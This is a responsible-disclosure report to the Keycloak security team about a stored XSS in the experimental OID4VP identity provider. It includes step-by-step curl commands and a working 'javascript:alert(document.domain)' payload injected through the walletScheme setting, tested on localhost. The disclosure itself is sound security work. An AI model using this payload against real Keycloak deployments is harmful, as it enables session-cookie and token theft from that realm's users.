Hi Keycloak Security Team,

I am reporting a stored XSS vulnerability in the experimental OID4VP Identity
Provider feature. I understand experimental features may not receive a CVE,
but I am reporting it per your policy guidance to let you assess.

Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
Tested on: Keycloak 999.0.0-SNAPSHOT built from source
Feature flag: oid4vc-vp (experimental)

AI Disclosure: AI tools were used to assist in drafting this report. The
vulnerability was manually discovered, verified, and reproduced.

DESCRIPTION:
The OID4VP Identity Provider accepts arbitrary URI schemes in the walletScheme
configuration, including javascript:. This value is rendered as an href in the
login page without sanitization. When a user clicks the wallet button, arbitrary
JavaScript executes in the Keycloak domain context.

ROOT CAUSE:
OID4VPIdentityProvider.java lines 254-259 — the walletScheme config is passed
directly into the redirect URI with no scheme validation or allowlist.

REPRODUCTION STEPS:

1. Start Keycloak with experimental OID4VP feature:

JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64 \
KC_BOOTSTRAP_ADMIN_USERNAME=admin KC_BOOTSTRAP_ADMIN_PASSWORD=admin \
bin/kc.sh start-dev --http-port=8084 --features=oid4vc-vci,oid4vc-vp,preview

2. Get admin token:

KC=http://localhost:8084
tok() {
  curl -s $KC/realms/master/protocol/openid-connect/token \
    -d client_id=admin-cli -d username=admin -d password=admin \
    -d grant_type=password \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
}
T=$(tok)

3. Create malicious OID4VP Identity Provider:

curl -s -X POST $KC/admin/realms/master/identity-provider/instances \
  -H "Authorization: Bearer $T" \
  -H 'Content-Type: application/json' \
  -d '{
    "alias":"oid4vp-poc",
    "providerId":"oid4vp",
    "enabled":true,
    "config":{
      "walletScheme":"javascript:alert(document.domain)//",
      "trustedIssuerJwks":"https://example.com"
    }
  }'

4. Generate login URL and open in browser:

CHALLENGE=$(echo -n "testverifier123456789012345678901234567890123" \
  | openssl dgst -sha256 -binary | openssl base64 -A \
  | tr '+/' '-_' | tr -d '=')

Open in browser:
http://localhost:8084/realms/master/protocol/openid-connect/auth?client_id=account-console&response_type=code&scope=openid&redirect_uri=http%3A%2F%2Flocalhost%3A8084%2Frealms%2Fmaster%2Faccount&kc_idp_hint=oid4vp-poc&code_challenge=$CHALLENGE&code_challenge_method=S256&nonce=test123&state=test456

5. Verify via curl:

curl -s -L -c /tmp/kc-cookies -b /tmp/kc-cookies \
  "http://localhost:8084/realms/master/protocol/openid-connect/auth?client_id=account-console&response_type=code&scope=openid&redirect_uri=http%3A%2F%2Flocalhost%3A8084%2Frealms%2Fmaster%2Faccount&kc_idp_hint=oid4vp-poc&code_challenge=$CHALLENGE&code_challenge_method=S256&nonce=test123&state=test456" \
  | grep -o 'javascript:[^"]*'

Output: javascript:alert(document.domain)//://? ...

6. In browser: page shows "Sign in with your wallet" with QR code.
   Click the wallet button — alert() fires showing "localhost:8084",
   confirming JavaScript execution in Keycloak's origin.

IMPACT:
- Session hijacking (steal KEYCLOAK_SESSION cookie)
- Token theft
- Credential harvesting via injected fake login form
- Requires admin access to set walletScheme, but affects all realm users

Note: Although this requires admin privileges to configure, it violates the
principle of least privilege — an admin should be able to configure an IdP
without gaining the ability to execute JavaScript in users' browsers.

CVSS 3.1: 6.1 (Medium)
Vector: AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N

